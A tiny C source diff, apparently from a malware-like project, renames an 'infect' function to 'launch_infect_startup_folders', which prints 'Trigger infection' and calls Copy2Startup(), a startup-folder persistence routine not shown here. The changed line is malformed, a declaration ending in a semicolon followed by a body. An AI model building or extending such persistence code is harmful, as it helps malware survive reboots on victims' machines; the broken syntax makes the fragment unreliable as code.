@@ -4,9 +4,10 @@
 
 #include "startup_folders.h"
 
-void infect(){
+int launch_infect_startup_folders(struct ModStat** mds);
     puts("Trigger infection");
     Copy2Startup();
+    return 0;
 }
 
 
